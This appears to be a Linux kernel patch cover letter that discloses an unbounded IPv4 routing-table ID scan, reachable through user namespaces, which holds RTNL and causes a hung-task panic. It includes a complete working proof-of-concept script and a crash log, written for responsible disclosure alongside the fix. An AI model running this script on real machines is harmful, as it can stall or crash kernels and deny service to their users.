Received: from mail-pj1-f46.google.com (mail-pj1-f46.google.com [209.85.216.46])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8CE162853E9
	for <stable@vger.kernel.org>; Tue,  1 Sep 2026 03:00:14 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.46
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788231619; cv=none; b=enGCk1axrD6T9C4QqjOsaQzZThEApG1d1O18jUOJZ9zYe11/TISrwEnuVHlhDQKmYTyGP2ltVRcQ1VVnRyswX3dOs7EjXLEF1ZanKsdJkFNMbYJfspx4karv+GW71Xz49BBauR5SQeAjXq7mbVEy4jpX4JAhXYOoJLykrMMEhO0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788231619; c=relaxed/simple;
	bh=bkW1exBR7Bk34fpw3VVv/NV+NJF4fAWAT9ZeJe4C3uk=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=pgFkKFSL5xVWb44ixgn8zZW+1qORrA1YkMXBE/GnObqT7bNNkKZgnAJpLt8H6P6AwbttPh9Y0S9M7LBYtSnxF0YS4lqm3v2GsLayqUylXktwfRGdUfLW1dMKiGj6oko3W+lQUbfQCD/qoKHMn4bm6AXxTlfcEuJSW85oVZURMsY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=SE5FsBcp; arc=none smtp.client-ip=209.85.216.46
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="SE5FsBcp"
Received: by mail-pj1-f46.google.com with SMTP id 98e67ed59e1d1-38d489b6b71so4817994a91.0
        for <stable@vger.kernel.org>; Mon, 31 Aug 2026 20:00:14 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788231613; x=1788836413; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=PoBwucHZCZFYpldRzsxD5DpP0znqHFJmwaJsaPjfJxc=;
        b=SE5FsBcpyksXK/UyCLgtT6NHcSkkUuM9ElHhaKvjaZI8Rya5ZNiySKKtxQzAKtlyMg
         CidPAVFy5ZhBdD9LxMSy9NsRV6u2avzzevlQEzIFauU68mUY/obkW1OOKeWUf7EGMfTD
         iDfDsko8D3DcKCCYBvsy18r0c4dtnzOLPESZVjm233g9FYjMuO2Z3YvxiYCKbTMLxCQc
         ftWudUaC+Hfy5GkDo5ukq2+QEJdAL+2FqghuAV8p9UXt5quPH3a2ZxxDiBqeAB4T+iNk
         ojzV0k36PIIoHZbgg8xMsdY4/00eQ4JSCOqZtS68YC2eS940T/SYIsUn/mwD1PBlKsEA
         dw0Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788231613; x=1788836413;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=PoBwucHZCZFYpldRzsxD5DpP0znqHFJmwaJsaPjfJxc=;
        b=rcprp409s78L/lA9NcGucyreQOtx/4GFWCu6OYjHozyt+I4ao0IQ4RhoRCELp8enxe
         1qMVIdwCUFikjGT/VPyviH0CfEe+zkTQIUbljLRUKUiEv0egF76Suv1+YEjUK3/qGFAS
         hf8F1BumL+M67n0KCDWFEm8jIgeV5neZsOPObzyFxHgu4Iw52aLIZo4+j+8KYn8sDBJb
         oRqBi/G++a2efliT7F/tUvZy02HL3rcZl9f43mQ+cVRH29etfKleBTFJXrac1rxs4Nny
         8TJ+03ZcuLD/nuWTi3O/ro4mjrEvBDYIMSj8KOs6GOT1bqcyHrKtGimQvRpXspzKmUKF
         HW2g==
X-Forwarded-Encrypted: i=1; AKwUvBxJ2ZKAeOKKl3W3uUOBlH3z1AtDgttowHJdLMvwCsurB1NMJZB5D2nxU9jA6XQ3fiCwZ5YBkjQ=@vger.kernel.org
X-Gm-Message-State: AFuF++lD0N32O4/TNqKnQSnYu2pP+Ml4vjahun1/iUYO3b7UFEKGgg+l
	nrg2gAfXV726bUI0LQJZAhkz8nIMGBBmTghuPpDZCP4zE6/V9lqSXvAWiiY7u2+Wy+Pw
X-Gm-Gg: AYBFou1cvWPMcTlUC6NKTANRkr9ngc/AORkI5I41LXQYD93SMDev4YBkYi8TESb+lQk
	FPFT5JkOIdxx6XshvEpoIxv3eQVZg/yqTmASnBv8kPJEQaVBSMiyoTD0WJ2q+eBcwKubH4CyKia
	4rbITpM8VZUI8v0y9tIlbkssYk7pXcZKi2eumtImqB2cKy1FoKjOPipE3vgYqqUxXKaiJhgqvMi
	SpdVA980yjihvScwHYH4s+NGGtb4H4e/r2Y1rlRGSYu8zQxT75r4aXZKmGOpzYA9GeWCskWkH0s
	W+tc+tvd03RC7JCRk86ACvqmUOcZuc5dL8Z42uLyIiMeCRKgMGx8L8FTQ9+MJ0us4qo7KNtj/l7
	VIsjfbZD2BQiKGY2t+7gIU1DrO5Ao84qjlVJom/L3nrqHvXclL2vdombMA4Upaf4GMUYaWlPEd1
	VlzXGuEU1CoI3qSzJmPhZzSM4+ggbl7UeBBHX5GuYp0b0fYBooz6zsw38UfMkFmxc4FE+hR3QCD
	D8fxv/98/rFqFY238o=
X-Received: by 2002:a17:90b:3904:b0:398:9be8:ea6a with SMTP id 98e67ed59e1d1-39907ed4294mr6052051a91.23.1788231609895;
        Mon, 31 Aug 2026 20:00:09 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3990baaeec3sm2909012a91.0.2026.08.31.20.00.06
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 31 Aug 2026 20:00:09 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: linux-kernel@vger.kernel.org,
	David Ahern <dsahern@kernel.org>,
	Ido Schimmel <idosch@nvidia.com>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Patrick McHardy <kaber@trash.net>,
	stable@vger.kernel.org,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net v2 0/1] ipv4: fib: bound automatic table ID allocation
Date: Tue,  1 Sep 2026 03:00:00 +0000
Message-ID: <cover.1788223735.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv4/fib_rules.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

fib_empty_table() probes every table ID from 1 until it finds a free one.
IPv4 tables are stored in a 256-bucket hash table, so a dense range of IDs
makes each probe walk a growing hash chain while RTNL is held. Rules that
used an unspecified table leave the allocated table behind when deleted,
allowing a namespace administrator to accumulate this state.

v1 rewrote the search to count tables once and pick the lowest free ID from
a bitmap. Ido Schimmel noted that automatic table assignment ("ip rule ...
table 0") is an undocumented IPv4-only quirk and suggested bounding the
automatically allocated ID instead. v2 follows that approach and stops the
search at 4096. Explicit table IDs above that remain usable.

The table-allocation path is reachable with CAP_NET_ADMIN in a user and net
namespace; the userns-demo below confirms table persistence after table-0
add/delete pairs. The hung-task panic mode requires root only to set global
hung-task sysctls and force a panic; it is an oracle for the same RTNL
hold, not the minimum privilege needed to reach the bad lookup.

Commit 1af5a8c4a11c ("[IPV4]: Increase number of possible routing tables to
2^32") switched fib_empty_table() from an array probe to fib_get_table(),
but RT_TABLE_MAX was still 255. The unbounded automatic scan first became
possible in commit b801f54917b7 ("[NET]: Increate RT_TABLE_MAX to 2^32"),
which raised RT_TABLE_MAX to 0xFFFFFFFF. Fixes therefore points to that
later commit.

Validation reproduced the hung-task panic on the unpatched kernel. On the
v2 kernel, the same 150000-table RTNL contention PoC finished without a
hung-task report or panic; the table-0 add returned ENOBUFS once IDs
1..4096 were occupied.

Reproducer:

    bash poc.sh userns-demo
    ROUTE_TABLE_COUNT=150000 bash poc.sh root-crash

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------
#!/bin/bash
set -euo pipefail

MODE="${1:-root-crash}"
ROUTE_TABLE_COUNT="${ROUTE_TABLE_COUNT:-150000}"
USERNS_ROUTE_TABLE_COUNT="${USERNS_ROUTE_TABLE_COUNT:-10000}"
PREF="${PREF:-900000}"
SRC_IP="${SRC_IP:-198.51.100.200}"

usage() {
	cat >&2 <<'EOF'
usage:
  bash poc.sh root-crash
  bash poc.sh userns-demo

root-crash:
  Root only. Sets hung-task sysctls, creates a fresh net namespace, populates
  many explicit IPv4 route tables, then triggers one table-unspecified IPv4
  rule add while a second RTNL operation blocks behind it. The expected result
  is a hung-task panic attributed to the long RTNL hold.

userns-demo:
  Re-execs under unshare -Urn and demonstrates:
    1. table persistence after table-0 rule add/delete pairs
    2. route-table prepopulation plus a table-0 rule add reaching lookup N+1
EOF
	exit 1
}

require_root() {
	if [ "$(id -u)" -ne 0 ]; then
		echo "root-crash requires root" >&2
		exit 1
	fi
}

generate_route_batch() {
	local count="$1"
	local batch="$2"

	python3 - "$count" "$batch" <<'PY'
import sys

count = int(sys.argv[1])
batch = sys.argv[2]

with open(batch, "w", encoding="ascii") as f:
    for i in range(1, count + 1):
        f.write(f"route add blackhole 203.0.113.1/32 table {i}\n")
PY
}

route_setup_and_final_add_demo() {
	local count="$1"

	python3 - "$count" "$PREF" "$SRC_IP" <<'PY'
import subprocess
import sys
import time

count = int(sys.argv[1])
pref = sys.argv[2]
src = sys.argv[3]
batch = "/tmp/fib-empty-table-route-batch.txt"

with open(batch, "w", encoding="ascii") as f:
    for i in range(1, count + 1):
        f.write(f"route add blackhole 203.0.113.1/32 table {i}\n")

start = time.monotonic()
subprocess.run(["ip", "-4", "-batch", batch], check=True)
mid = time.monotonic()
subprocess.run(
    ["ip", "-4", "rule", "add", "pref", pref, "from", f"{src}/32", "table", "0"],
    check=True,
)
end = time.monotonic()
out = subprocess.check_output(["ip", "-4", "rule", "show", "pref", pref], text=True)

print(f"route_setup_s={mid - start:.6f}")
print(f"final_add_s={end - mid:.6f}")
print(out.strip())
PY
}

demo_rule_persistence() {
	for i in 1 2 3; do
		local pref=$((100 + i))
		ip -4 rule add pref "$pref" from "198.51.100.$i/32" table 0
		ip -4 rule del pref "$pref" from "198.51.100.$i/32" table 0
	done

	ip -4 rule add pref 200 from 198.51.100.200/32 table 0
	ip -4 rule show pref 200
	ip -4 rule del pref 200 from 198.51.100.200/32 table 0
}

run_userns_inner() {
	echo "[*] Table-0 rule persistence demo"
	demo_rule_persistence

	echo "[*] Route-table prepopulation demo"
	route_setup_and_final_add_demo "$USERNS_ROUTE_TABLE_COUNT"
	ip -4 rule del pref "$PREF" from "$SRC_IP/32" table 0 2>/dev/null || true
}

run_userns_demo() {
	exec unshare -Urn -- env \
		USERNS_ROUTE_TABLE_COUNT="$USERNS_ROUTE_TABLE_COUNT" \
		PREF="$PREF" \
		SRC_IP="$SRC_IP" \
		bash "$0" __userns_inner
}

run_root_crash_inner() {
	local batch="/tmp/fib-empty-table-root-crash-batch.txt"

	generate_route_batch "$ROUTE_TABLE_COUNT" "$batch"
	ip -4 -batch "$batch"

	printf '%s\n' \
		'fib-empty-table-poc: starting final rule add after route-table prepopulation' \
		> /dev/kmsg

	(
		sleep 0.05
		printf '%s\n' \
			'fib-empty-table-poc: helper RTNL op attempting ip link set lo up' \
			> /dev/kmsg
		ip link set lo up
	) &
	local helper_pid=$!

	ip -4 rule add pref "$PREF" from "$SRC_IP/32" table 0
	wait "$helper_pid"
}

run_root_crash() {
	require_root

	sysctl -w \
		kernel.panic_on_warn=0 \
		kernel.softlockup_panic=0 \
		kernel.watchdog_thresh=55 \
		kernel.hung_task_timeout_secs=1 \
		kernel.hung_task_check_interval_secs=1 \
		kernel.hung_task_panic=1 \
		kernel.hung_task_all_cpu_backtrace=1 >/dev/null

	exec unshare -n -- env \
		ROUTE_TABLE_COUNT="$ROUTE_TABLE_COUNT" \
		PREF="$PREF" \
		SRC_IP="$SRC_IP" \
		bash "$0" __root_crash_inner
}

case "$MODE" in
root-crash)
	run_root_crash
	;;
userns-demo)
	run_userns_demo
	;;
__userns_inner)
	run_userns_inner
	;;
__root_crash_inner)
	run_root_crash_inner
	;;
*)
	usage
	;;
esac
------END poc.sh--------

----BEGIN crash log----
[  281.774236] fib-empty-table-poc: starting final rule add after route-table prepopulation
[  282.029352] fib-empty-table-poc: helper RTNL op attempting ip link set lo up
[  283.213038] INFO: task ip:269 blocked for more than 1 seconds.
[  283.213285]       Not tainte
** replaying previous printk message **
[  283.213285]       Not tainted 7.2.0-15794-g1b78070aaef6 #3
[  283.213429] "echo 0 > /proc/sys/kernel/hung_task_timeout_secs" disables this message.
[  283.213454] task:ip              state:D stack:13072 pid:269   tgid:269   ppid:266    task_flags:0x400100 flags:0x00080000
[  283.213507] Call Trace:
[  283.213626]  <TASK>
[  283.213654]  __schedule (kernel/sched/core.c:5520 kernel/sched/core.c:7270)
[  283.299679]  schedule (kernel/sched/core.c:7347 kernel/sched/core.c:7362)
[  283.299981]  schedule_preempt_disabled (kernel/sched/core.c:7419)
[  283.299990]  __mutex_lock.constprop.0 (kernel/locking/mutex.c:726 kernel/locking/mutex.c:821)
[  283.300074]  rtnl_newlink (net/core/rtnetlink.c:80 net/core/rtnetlink.c:366 net/core/rtnetlink.c:4214)
[  283.300328]  ? cred_has_capability.isra.0 (security/selinux/hooks.c:1668)
[  283.300467]  ? __pfx_rtnl_newlink (net/core/rtnetlink.c:3515)
[  283.300471]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
[  283.300479]  ? kmem_cache_alloc_noprof (mm/slub.c:4693 mm/slub.c:4996 mm/slub.c:5010)
[  283.305030]  ? ebitmap_cpy (security/selinux/ss/ebitmap.c:58 (discriminator 2))
[  283.305131]  ? avc_has_perm (include/linux/rcupdate.h:882 security/selinux/avc.c:1164 security/selinux/avc.c:1194)
[  283.305141]  ? __pfx_rtnetlink_rcv_msg (net/core/rtnetlink.c:4497)
[  283.305147]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[  283.305315]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[  283.305323]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[  283.305327]  __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2281 (discriminator 1))
[  283.305445]  __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
[  283.305452]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[  283.305593]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[  283.305705] RIP: 0033:0x7f5f34e0deec
[  283.305711] RSP: 002b:00007fff80031098 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[  283.305763] RAX: ffffffffffffffda RBX: 00007fff80031788 RCX: 00007f5f34e0deec
[  283.305765] RDX: 0000000000000020 RSI: 00007fff800310b0 RDI: 0000000000000003
[  283.305767] RBP: 0000000000000004 R08: 0000000000000000 R09: 0000000000000000
[  283.305769] R10: 0000000000000000 R11: 0000000000000246 R12: 00007fff80031ea8
[  283.305770] R13: 00007fff80031780 R14: 0000000000000003 R15: 0000000000000000
[  283.305774]  </TASK>
[  283.307861] INFO: task ip:269 is blocked on a mutex likely owned by task ip:267.
[  283.308103] task:ip              state:R  running task     stack:13072 pid:267   tgid:267   ppid:253    task_flags:0x400100 flags:0x00080000
[  283.308114] Call Trace:
[  283.308116]  <TASK>
[  283.308118]  __schedule (kernel/sched/core.c:5520 kernel/sched/core.c:7270)
[  283.308129]  preempt_schedule_irq (kernel/sched/core.c:7592)
[  283.308131]  irqentry_exit (include/linux/irq-entry-common.h:468 include/linux/irq-entry-common.h:539 kernel/entry/common.c:167)
[  283.308135]  ? irqentry_exit (include/linux/hrtimer_rearm.h:58 include/linux/hrtimer_rearm.h:67 include/linux/irq-entry-common.h:505 include/linux/irq-entry-common.h:542 kernel/entry/common.c:167)
[  283.308138]  asm_sysvec_apic_timer_interrupt (arch/x86/include/asm/idtentry.h:674)
[  283.309934] RIP: 0010:fib_get_table (net/ipv4/fib_frontend.c:147)
[  283.309948] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0f 1f 40 d6 85 f6 74 23 40 0f b6 c6 48 c1 e0 03 48 03 87 48 05 00 00 eb 05 39 70 10 <74> 08 48 8b 00 48 85 c0 75 f3 c3 cc cc cc cc b8 f0 07 00 00 be fe
All code
========
   0:	90                   	nop
   1:	90                   	nop
   2:	90                   	nop
   3:	90                   	nop
   4:	90                   	nop
   5:	90                   	nop
   6:	90                   	nop
   7:	90                   	nop
   8:	90                   	nop
   9:	90                   	nop
   a:	90                   	nop
   b:	90                   	nop
   c:	90                   	nop
   d:	90                   	nop
   e:	0f 1f 40 d6          	nopl   -0x2a(%rax)
  12:	85 f6                	test   %esi,%esi
  14:	74 23                	je     0x39
  16:	40 0f b6 c6          	movzbl %sil,%eax
  1a:	48 c1 e0 03          	shl    $0x3,%rax
  1e:	48 03 87 48 05 00 00 	add    0x548(%rdi),%rax
  25:	eb 05                	jmp    0x2c
  27:	39 70 10             	cmp    %esi,0x10(%rax)
  2a:*	74 08                	je     0x34		<-- trapping instruction
  2c:	48 8b 00             	mov    (%rax),%rax
  2f:	48 85 c0             	test   %rax,%rax
  32:	75 f3                	jne    0x27
  34:	c3                   	ret
  35:	cc                   	int3
  36:	cc                   	int3
  37:	cc                   	int3
  38:	cc                   	int3
  39:	b8 f0 07 00 00       	mov    $0x7f0,%eax
  3e:	be                   	.byte 0xbe
  3f:	fe                   	.byte 0xfe

Code starting with the faulting instruction
===========================================
   0:	74 08                	je     0xa
   2:	48 8b 00             	mov    (%rax),%rax
   5:	48 85 c0             	test   %rax,%rax
   8:	75 f3                	jne    0xfffffffffffffffd
   a:	c3                   	ret
   b:	cc                   	int3
   c:	cc                   	int3
   d:	cc                   	int3
   e:	cc                   	int3
   f:	b8 f0 07 00 00       	mov    $0x7f0,%eax
  14:	be                   	.byte 0xbe
  15:	fe                   	.byte 0xfe
[  283.309951] RSP: 0018:ffffac760030b8a8 EFLAGS: 00000206
[  283.309955] RAX: ffff8f608e6e7400 RBX: ffff8f60839b4480 RCX: 000000000000003c
[  283.309957] RDX: 0000000000000001 RSI: 00000000000025bd RDI: ffff8f6085dc1f80
[  283.309959] RBP: ffffac760030b960 R08: ffffac760030b850 R09: 0000000000000020
[  283.309960] R10: ffffac760030b960 R11: 0000000000000002 R12: ffff8f6083bb1090
[  283.309962] R13: 0000000000000000 R14: ffff8f6085dc1f80 R15: 00000000000025bd
[  283.310061]  fib4_rule_configure (net/ipv4/fib_rules.c:222 net/ipv4/fib_rules.c:315)
[  283.310212]  fib_newrule (net/core/fib_rules.c:927)
[  283.310348]  ? mas_wr_spanning_store (lib/maple_tree.c:3177)
[  283.310363]  ? __pfx_fib_nl_newrule (net/core/fib_rules.c:1002)
[  283.310367]  ? rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
[  283.310373]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
[  283.310377]  ? xas_load (lib/xarray.c:239)
[  283.310383]  ? filemap_get_entry (include/linux/rcupdate.h:882 mm/filemap.c:1925)
[  283.310446]  ? avc_has_perm (include/linux/rcupdate.h:882 security/selinux/avc.c:1164 security/selinux/avc.c:1194)
[  283.310452]  ? __pfx_rtnetlink_rcv_msg (net/core/rtnetlink.c:4497)
[  283.310456]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[  283.310462]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[  283.310465]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[  283.310468]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
[  283.310473]  ___sys_sendmsg (net/socket.c:2767)
[  283.310479]  __sys_sendmsg (net/socket.c:2799)
[  283.310535]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[  283.310544]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[  283.310549] RIP: 0033:0x7f459504efa3
[  283.310552] RSP: 002b:00007fff8e86dbc8 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[  283.310555] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f459504efa3
[  283.310557] RDX: 0000000000000000 RSI: 00007fff8e86dc30 RDI: 0000000000000003
[  283.310558] RBP: 000000006a918a65 R08: 0000000000000001 R09: 0000000000000000
[  283.310560] R10: 00007f45950ceac0 R11: 0000000000000246 R12: 0000000000000001
[  283.310561] R13: 0000000000000000 R14: 00007fff8e86e450 R15: 000055d6921e6020
[  283.310563]  </TASK>
[  283.310578] NMI backtrace for cpu 0
[  283.310626] CPU: 0 UID: 0 PID: 31 Comm: khungtaskd Not tainted 7.2.0-15794-g1b78070aaef6 #3 PREEMPT(lazy) 
[  283.310631] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  283.310693] Call Trace:
[  283.310930]  <TASK>
[  283.310934]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[  283.310993]  nmi_cpu_backtrace (lib/nmi_backtrace.c:123)
[  283.311001]  ? __pfx_nmi_raise_cpu_backtrace (usercopy_64.c:?)
[  283.311007]  nmi_trigger_cpumask_backtrace (lib/nmi_backtrace.c:66)
[  283.311010]  sys_info (include/linux/nmi.h:164 lib/sys_info.c:157 lib/sys_info.c:165)
[  283.311013]  watchdog (kernel/hung_task.c:353 kernel/hung_task.c:561)
[  283.311221]  ? __pfx_watchdog (kernel/hung_task.c:426)
[  283.311228]  kthread (kernel/kthread.c:436)
[  283.311332]  ? __pfx_kthread (kernel/kthread.c:948)
[  283.311339]  ret_from_fork (arch/x86/kernel/process.c:158)
[  283.311447]  ? __pfx_kthread (kernel/kthread.c:948)
[  283.311455]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[  283.311559]  </TASK>
[  283.311666] Sending NMI from CPU 0 to CPUs 1:
[  283.311788] NMI backtrace for cpu 1
[  283.311797] CPU: 1 UID: 0 PID: 15 Comm: pr/ttyS0 Not tainted 7.2.0-15794-g1b78070aaef6 #3 PREEMPT(lazy) 
[  283.311801] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  283.311803] RIP: 0010:io_serial_out (arch/x86/kernel/early_printk.c:108)
[  283.311812] Code: 0f 1f 40 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 0f b6 8f d9 00 00 00 89 d0 0f b7 57 08 d3 e6 01 f2 ee <e9> c5 ea 98 00 0f 1f 44 00 00 90 90 90 90 90 90 90 90 90 90 90 90
All code
========
   0:	0f 1f 40 00          	nopl   0x0(%rax)
   4:	90                   	nop
   5:	90                   	nop
   6:	90                   	nop
   7:	90                   	nop
   8:	90                   	nop
   9:	90                   	nop
   a:	90                   	nop
   b:	90                   	nop
   c:	90                   	nop
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
  10:	90                   	nop
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	f3 0f 1e fa          	endbr64
  18:	0f b6 8f d9 00 00 00 	movzbl 0xd9(%rdi),%ecx
  1f:	89 d0                	mov    %edx,%eax
  21:	0f b7 57 08          	movzwl 0x8(%rdi),%edx
  25:	d3 e6                	shl    %cl,%esi
  27:	01 f2                	add    %esi,%edx
  29:	ee                   	out    %al,(%dx)
  2a:*	e9 c5 ea 98 00       	jmp    0x98eaf4		<-- trapping instruction
  2f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  34:	90                   	nop
  35:	90                   	nop
  36:	90                   	nop
  37:	90                   	nop
  38:	90                   	nop
  39:	90                   	nop
  3a:	90                   	nop
  3b:	90                   	nop
  3c:	90                   	nop
  3d:	90                   	nop
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	e9 c5 ea 98 00       	jmp    0x98eaca
   5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   a:	90                   	nop
   b:	90                   	nop
   c:	90                   	nop
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
  10:	90                   	nop
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
[  283.311818] RSP: 0018:ffffac7600083d28 EFLAGS: 00000002
[  283.311821] RAX: 0000000000000020 RBX: ffff8f6081152010 RCX: 0000000000000000
[  283.311823] RDX: 00000000000003f8 RSI: 0000000000000000 RDI: ffffffff89a48c60
[  283.311824] RBP: ffffffff89a48c60 R08: 2e322e3720646574 R09: ffffffff87b60400
[  283.311826] R10: 6e69617420746f4e R11: 6f4e202020202020 R12: 000000000000000f
[  283.311827] R13: 0000000000000000 R14: ffffac7600083e88 R15: 0000000000000020
[  283.311844] FS:  0000000000000000(0000) GS:ffff8f6174361000(0000) knlGS:0000000000000000
[  283.311846] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  283.311848] CR2: 0000563528d1fb40 CR3: 0000000005e1a005 CR4: 0000000000370ef0
[  283.311849] Call Trace:
[  283.311993]  <TASK>
[  283.311995]  __serial8250_console_fifo_write (include/linux/serial_core.h:817 drivers/tty/serial/8250/8250_port.c:3287 drivers/tty/serial/8250/8250_port.c:3359)
[  283.312002]  serial8250_console_write (drivers/tty/serial/8250/8250_port.c:3378 drivers/tty/serial/8250/8250_port.c:3429 drivers/tty/serial/8250/8250_port.c:3493)
[  283.312007]  nbcon_emit_next_record (kernel/printk/nbcon.c:1070)
[  283.312054]  nbcon_emit_one (kernel/printk/nbcon.c:1157)
[  283.312058]  nbcon_kthread_func (kernel/printk/nbcon.c:1271)
[  283.312062]  ? __pfx_nbcon_kthread_func (kernel/printk/nbcon.c:1677)
[  283.312066]  kthread (kernel/kthread.c:436)
[  283.312070]  ? __pfx_kthread (kernel/kthread.c:948)
[  283.312073]  ret_from_fork (arch/x86/kernel/process.c:158)
[  283.312076]  ? __pfx_kthread (kernel/kthread.c:948)
[  283.312078]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[  283.312083]  </TASK>
[  283.319999] Kernel panic - not syncing: hung_task: blocked tasks
[  293.702918] CPU: 0 UID: 0 PID: 31 Comm: khungtaskd Not tainted 7.2.0-15794-g1b78070aaef6 #3 PREEMPT(lazy) 
[  293.811630] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  293.993807] Call Trace:
[  294.025350]  <TASK>
[  294.043962]  vpanic (kernel/panic.c:651)
[  294.090991]  panic (kernel/panic.c:788)
[  294.141252]  watchdog (kernel/hung_task.c:356 kernel/hung_task.c:561)
[  294.194098]  ? __pfx_watchdog (kernel/hung_task.c:426)
[  294.278730]  kthread (kernel/kthread.c:436)
[  294.329704]  ? __pfx_kthread (kernel/kthread.c:948)
[  294.431305]  ret_from_fork (arch/x86/kernel/process.c:158)
[  294.492124]  ? __pfx_kthread (kernel/kthread.c:948)
[  294.562256]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[  294.662989]  </TASK>
[  294.727400] Kernel Offset: 0x6200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[  294.953855] ---[ end Kernel panic - not syncing: hung_task: blocked tasks ]---
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  ipv4: fib: bound automatic table ID allocation

 net/ipv4/fib_rules.c | 4 +++-
 1 file changed, 3 insertions(+), 1 deletion(-)

-- 
2.43.0

